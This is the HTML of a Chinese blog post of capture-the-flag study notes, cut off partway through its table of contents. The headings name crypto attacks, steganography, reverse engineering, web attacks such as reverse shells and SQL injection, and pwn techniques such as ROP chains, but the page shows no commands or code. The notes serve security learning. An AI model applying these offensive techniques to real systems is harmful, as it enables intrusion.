<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Kali共享文件夹这个地址 &#x2F;mnt&#x2F;hgfs&#x2F;LinuxShare MISCGoogle &quot;aaa&quot; 必须出现的词汇   site:aaa.com 只搜索这个网站的结果   -aaa 结果不出现某个词汇   imagesize:500x500 只搜索这么大的图片(像素) filetype:pdf 只搜索pdf格式的文档   * 通配符,不确定这个位置填啥可以写 aaa or">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF">
<meta property="og:url" content="https://narafluorine.github.io/2024/09/04/20008_CTF/index.html">
<meta property="og:site_name" content="Fluorine&#39;s blog">
<meta property="og:description" content="Kali共享文件夹这个地址 &#x2F;mnt&#x2F;hgfs&#x2F;LinuxShare MISCGoogle &quot;aaa&quot; 必须出现的词汇   site:aaa.com 只搜索这个网站的结果   -aaa 结果不出现某个词汇   imagesize:500x500 只搜索这么大的图片(像素) filetype:pdf 只搜索pdf格式的文档   * 通配符,不确定这个位置填啥可以写 aaa or">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-09-04T15:21:27.000Z">
<meta property="article:modified_time" content="2026-01-20T13:03:57.317Z">
<meta property="article:author" content="Fluorine Wengers">
<meta property="article:tag" content="Algorithm">
<meta property="article:tag" content="Game">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CTF</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="Fluorine's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     --><!--
       --><li><a href="/friends/">友链</a></li><!--
     --><!--
       --><li><a href="/QSL/">QSL</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/09/05/20009_ATC_2025/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/09/03/20006_XCPC_2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://narafluorine.github.io/2024/09/04/20008_CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&text=CTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&title=CTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&is_video=false&description=CTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CTF&body=Check out this article: https://narafluorine.github.io/2024/09/04/20008_CTF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&title=CTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&title=CTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&title=CTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&title=CTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://narafluorine.github.io/2024/09/04/20008_CTF/&name=CTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://narafluorine.github.io/2024/09/04/20008_CTF/&t=CTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kali"><span class="toc-number">1.</span> <span class="toc-text">Kali</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="toc-number">1.1.</span> <span class="toc-text">共享文件夹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Google"><span class="toc-number">2.1.</span> <span class="toc-text">Google</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webs"><span class="toc-number">2.2.</span> <span class="toc-text">Webs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7"><span class="toc-number">2.3.</span> <span class="toc-text">属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rtf"><span class="toc-number">2.4.</span> <span class="toc-text">rtf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gif"><span class="toc-number">2.5.</span> <span class="toc-text">gif</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#binwalk"><span class="toc-number">2.6.</span> <span class="toc-text">binwalk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86"><span class="toc-number">2.7.</span> <span class="toc-text">ZIP伪加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%82%85%E9%87%8C%E5%8F%B6%E7%9B%B2%E6%B0%B4%E5%8D%B0"><span class="toc-number">2.8.</span> <span class="toc-text">傅里叶盲水印</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wireshark"><span class="toc-number">2.9.</span> <span class="toc-text">Wireshark</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98%E6%94%B9%E5%8F%98"><span class="toc-number">2.10.</span> <span class="toc-text">图片宽高改变</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#F5%E9%9A%90%E5%86%99"><span class="toc-number">2.11.</span> <span class="toc-text">F5隐写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#png%E8%A1%A5%E9%BD%90IDAT"><span class="toc-number">2.12.</span> <span class="toc-text">png补齐IDAT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B9%E5%B8%A6%E7%A7%81%E8%B4%A7"><span class="toc-number">2.13.</span> <span class="toc-text">文件夹带私货</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LSB%E5%9B%BE%E5%83%8F%E9%9A%90%E5%86%99"><span class="toc-number">2.14.</span> <span class="toc-text">LSB图像隐写</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Webs-1"><span class="toc-number">3.1.</span> <span class="toc-text">Webs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%80"><span class="toc-number">3.2.</span> <span class="toc-text">数论基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8B%92%E8%AE%A9%E5%BE%B7%E7%AC%A6%E5%8F%B7"><span class="toc-number">3.2.1.</span> <span class="toc-text">勒让德符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99%E7%9A%84%E6%80%A7%E8%B4%A8"><span class="toc-number">3.2.2.</span> <span class="toc-text">二次剩余的性质</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8B%92%E8%AE%A9%E5%BE%B7%E7%AC%A6%E5%8F%B7%E4%B8%AD%E8%B4%A8%E6%95%B0%E7%9A%84%E6%80%A7%E8%B4%A8"><span class="toc-number">3.2.3.</span> <span class="toc-text">勒让德符号中质数的性质</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RC4"><span class="toc-number">3.3.</span> <span class="toc-text">RC4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81"><span class="toc-number">3.4.</span> <span class="toc-text">常见编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASCII"><span class="toc-number">3.5.</span> <span class="toc-text">ASCII</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64"><span class="toc-number">3.6.</span> <span class="toc-text">base64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XOR"><span class="toc-number">3.7.</span> <span class="toc-text">XOR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81"><span class="toc-number">3.8.</span> <span class="toc-text">凯撒密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA%E7%AD%BE%E5%90%8D"><span class="toc-number">3.9.</span> <span class="toc-text">RSA签名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RSA"><span class="toc-number">3.10.</span> <span class="toc-text">RSA</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-enc-key"><span class="toc-number">3.10.1.</span> <span class="toc-text">0 .enc .key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-e-16"><span class="toc-number">3.10.2.</span> <span class="toc-text">1 e&#x3D;16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-pqrs-%E4%BD%86%E6%98%AFnext-prime"><span class="toc-number">3.10.3.</span> <span class="toc-text">2 pqrs,但是next_prime()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BA%8C%E9%A1%B9%E5%BC%8F%E6%A8%A1"><span class="toc-number">3.10.4.</span> <span class="toc-text">3 二项式模</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%8D%E7%9F%A5%E9%81%93%E5%8F%A6%E4%B8%80%E5%8D%8A"><span class="toc-number">3.10.5.</span> <span class="toc-text">4 不知道另一半</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%BB%99%E5%87%BA-p-q-q-p"><span class="toc-number">3.10.6.</span> <span class="toc-text">5 给出 $p^q+q^p$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%B7%B2%E7%9F%A5-msg-2-a-msg-1-b-Franklin-Reiter-attack-%E7%9B%B8%E5%85%B3%E6%B6%88%E6%81%AF%E6%94%BB%E5%87%BB"><span class="toc-number">3.10.7.</span> <span class="toc-text">6 已知 $msg_2&#x3D;a*msg_1+b$ Franklin-Reiter attack 相关消息攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E9%95%BF%E5%BA%A6129%E4%BD%8D-n%E9%95%BF%E5%BA%A62048%E4%BD%8D-%E7%84%B6%E5%90%8E%E4%B8%89%E4%BB%BD%E5%AF%86%E6%96%87%E5%BE%97%E5%88%B0%E4%BA%86-m-2"><span class="toc-number">3.10.8.</span> <span class="toc-text">flag长度129位,n长度2048位,然后三份密文得到了 $m^2$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%A8%A1%E6%84%8F%E4%B9%89%E6%80%9D%E8%80%83"><span class="toc-number">3.10.9.</span> <span class="toc-text">7 模意义思考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E7%BB%99%E5%AE%9A-n-ppq-%E9%A2%9D%E5%A4%96hint-invert-n-p-1-q-1"><span class="toc-number">3.11.</span> <span class="toc-text">8 给定 $n&#x3D;ppq$ ,额外hint&#x3D;invert(n,(p-1)*(q-1))</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pollard%E2%80%99s-p-1-method"><span class="toc-number">3.11.1.</span> <span class="toc-text">Pollard’s p-1 method</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Williams%E2%80%99-p-1-method"><span class="toc-number">3.11.2.</span> <span class="toc-text">Williams’ p+1 method</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wiener-Attack-%E7%BB%B4%E7%BA%B3%E6%94%BB%E5%87%BB-%E8%BF%9E%E5%88%86%E6%95%B0%E6%94%BB%E5%87%BB"><span class="toc-number">3.12.</span> <span class="toc-text">Wiener Attack 维纳攻击 连分数攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CopperSmith"><span class="toc-number">3.12.1.</span> <span class="toc-text">CopperSmith</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2048%E4%BD%8D%E7%9F%A5%E9%81%93%E5%89%8D1108%E4%BD%8D%E4%B8%8D%E7%9F%A5%E9%81%93%E5%90%8E940%E4%BD%8D"><span class="toc-number">3.12.1.1.</span> <span class="toc-text">2048位知道前1108位不知道后940位:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E9%81%93%E4%BD%8E%E4%BD%8D400%E6%B1%82%E9%AB%98%E4%BD%8D112"><span class="toc-number">3.12.2.</span> <span class="toc-text">知道低位400求高位112</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3q-%E7%BB%99%E5%AE%9An-p-q-3-%E4%BB%A5%E5%8F%8Aq%E7%9A%84%E9%AB%98381%E4%BD%8D-%E5%B0%9D%E8%AF%95%E5%88%86%E8%A7%A3pq"><span class="toc-number">3.12.3.</span> <span class="toc-text">3q: 给定n&#x3D;p*(q^3) 以及q的高381位,尝试分解pq:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%B2%E7%9F%A5%E6%98%8E%E6%96%87%E4%BD%8E%E4%BD%8D%E6%B1%82%E9%AB%98%E4%BD%8D"><span class="toc-number">3.12.4.</span> <span class="toc-text">已知明文低位求高位</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E6%95%B0%E5%A4%84%E7%90%86"><span class="toc-number">3.13.</span> <span class="toc-text">大数处理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task1"><span class="toc-number">3.13.1.</span> <span class="toc-text">task1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task2"><span class="toc-number">3.13.2.</span> <span class="toc-text">task2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task3"><span class="toc-number">3.13.3.</span> <span class="toc-text">task3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Knapsnack"><span class="toc-number">3.14.</span> <span class="toc-text">Knapsnack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Grobner%E5%9F%BA"><span class="toc-number">3.15.</span> <span class="toc-text">Gröbner基</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981"><span class="toc-number">3.15.1.</span> <span class="toc-text">例题1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ECC-%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86"><span class="toc-number">3.16.</span> <span class="toc-text">ECC 椭圆曲线加密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E9%81%93%E4%B8%A4%E4%B8%AAQ%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84k%E6%B1%82P"><span class="toc-number">3.16.1.</span> <span class="toc-text">知道两个Q和对应的k求P</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5P-a-b-mod-%E5%B7%B2%E7%9F%A52P-3P-%E2%80%A6-7P"><span class="toc-number">3.16.2.</span> <span class="toc-text">未知P,a,b,mod,已知2P,3P,…,7P</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ECDLP-%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0"><span class="toc-number">3.16.3.</span> <span class="toc-text">ECDLP 椭圆曲线离散对数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%AF%86%E7%A0%81-Lattice"><span class="toc-number">3.17.</span> <span class="toc-text">格密码 Lattice</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8ELLL"><span class="toc-number">3.17.1.</span> <span class="toc-text">关于LLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-Random-Revenge"><span class="toc-number">3.17.2.</span> <span class="toc-text">Java Random Revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86%E9%80%89%E8%89%B2%E9%97%AE%E9%A2%98"><span class="toc-number">3.17.3.</span> <span class="toc-text">中国剩余定理选色问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E4%B8%80%E4%B8%AA%E6%A8%A1-mathbb-F-2-8-mathbb-F-2-x-X-8-X-4-X-3-X-1-%E7%9A%84%E7%8E%AF%E4%B8%AD%E6%B1%82%E8%A7%A3%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84-Ax-b"><span class="toc-number">3.17.4.</span> <span class="toc-text">在一个模 $\mathbb{F}_{2^8}&#x3D;\mathbb{F}_2[x]&#x2F;(X^8+X^4+X^3+X+1)$ 的环中求解线性方程组 Ax&#x3D;b</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E7%8E%AF%E4%B8%8A%E7%9A%84%E6%AC%A0%E5%AE%9A%E6%96%B9%E7%A8%8B%E7%BB%84"><span class="toc-number">3.17.5.</span> <span class="toc-text">整数环上的欠定方程组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%84%8F%E4%B9%89%E4%B8%8B%E7%9A%84%E6%AC%A0%E5%AE%9A%E6%96%B9%E7%A8%8B%E7%BB%84"><span class="toc-number">3.17.6.</span> <span class="toc-text">模意义下的欠定方程组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LWE-%E5%AE%B9%E9%94%99%E5%AD%A6%E4%B9%A0%E9%97%AE%E9%A2%98-learning-with-errors-problem"><span class="toc-number">3.17.7.</span> <span class="toc-text">LWE 容错学习问题 learning with errors problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E5%8A%A0%E5%AF%86%E4%BD%93%E7%B3%BB-NTRU"><span class="toc-number">3.17.8.</span> <span class="toc-text">神秘加密体系(NTRU)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mt19937"><span class="toc-number">3.17.9.</span> <span class="toc-text">mt19937</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E9%9B%86%E5%92%8C"><span class="toc-number">3.17.10.</span> <span class="toc-text">子集和</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFSR"><span class="toc-number">3.18.</span> <span class="toc-text">LFSR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AES"><span class="toc-number">3.19.</span> <span class="toc-text">AES</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%9E%E7%A7%98%E9%A2%98"><span class="toc-number">3.20.</span> <span class="toc-text">神秘题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task1-1"><span class="toc-number">3.20.1.</span> <span class="toc-text">task1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task2-1"><span class="toc-number">3.20.2.</span> <span class="toc-text">task2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JSFuck"><span class="toc-number">3.21.</span> <span class="toc-text">JSFuck</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA-EXE-ELF"><span class="toc-number">4.1.</span> <span class="toc-text">IDA(EXE ELF)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E4%BF%AE%E6%94%B9%E6%BA%90%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.1.</span> <span class="toc-text">IDA修改源文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jadx-gui-APK-CLASS"><span class="toc-number">4.2.</span> <span class="toc-text">Jadx_gui(APK CLASS)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">5.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">5.1.</span> <span class="toc-text">常用工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%B7%AF%E5%BE%84"><span class="toc-number">5.2.</span> <span class="toc-text">常见路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BurpSuite"><span class="toc-number">5.3.</span> <span class="toc-text">BurpSuite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc"><span class="toc-number">5.4.</span> <span class="toc-text">nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-SSH%E5%8F%8D%E5%90%91Shell%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84"><span class="toc-number">5.5.</span> <span class="toc-text">反弹shell SSH反向Shell端口映射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%A0%E4%B8%AA%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.6.</span> <span class="toc-text">几个需要注意的类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5-sha1%E5%BC%BA%E7%A2%B0%E6%92%9E"><span class="toc-number">5.7.</span> <span class="toc-text">md5,sha1强碰撞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwntools"><span class="toc-number">5.8.</span> <span class="toc-text">pwntools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HackBar"><span class="toc-number">5.9.</span> <span class="toc-text">HackBar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-number">5.10.</span> <span class="toc-text">PHP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%AE%A1%E8%AE%A1"><span class="toc-number">5.10.1.</span> <span class="toc-text">php审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#backup"><span class="toc-number">5.11.</span> <span class="toc-text">backup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-number">5.12.</span> <span class="toc-text">优先级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%A4%A7%E6%9D%82%E7%83%A9"><span class="toc-number">5.13.</span> <span class="toc-text">Linux大杂烩</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sql%E6%B3%A8%E5%85%A5"><span class="toc-number">5.14.</span> <span class="toc-text">Sql注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">6.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PRE"><span class="toc-number">6.1.</span> <span class="toc-text">PRE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E5%A3%B3"><span class="toc-number">6.2.</span> <span class="toc-text">查壳</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-number">6.3.</span> <span class="toc-text">ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task1-2"><span class="toc-number">6.3.1.</span> <span class="toc-text">task1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E4%B8%AA%E9%A2%98%E7%9A%84%E7%AD%94%E6%A1%88%E2%80%A6"><span class="toc-number">6.3.2.</span> <span class="toc-text">这个题的答案…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E5%B9%BF%E6%B3%9B%E5%9C%B0%E2%80%A6"><span class="toc-number">6.3.3.</span> <span class="toc-text">更广泛地…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task2-2"><span class="toc-number">6.3.4.</span> <span class="toc-text">task2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task3-1"><span class="toc-number">6.3.5.</span> <span class="toc-text">task3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#task4"><span class="toc-number">6.3.6.</span> <span class="toc-text">task4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP%E9%93%BE"><span class="toc-number">6.4.</span> <span class="toc-text">ROP链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#task1-3"><span class="toc-number">6.4.1.</span> <span class="toc-text">task1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary-%E9%87%91%E4%B8%9D%E9%9B%80"><span class="toc-number">6.5.</span> <span class="toc-text">Canary 金丝雀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ex-%E6%8B%BF%E5%88%B0%E9%9D%B6%E6%9C%BA%E7%9A%84sh%E4%B9%8B%E5%90%8E%E6%88%91%E4%BB%AC%E8%83%BD%E5%B9%B2%E4%BB%80%E4%B9%88%E5%91%A2"><span class="toc-number">6.6.</span> <span 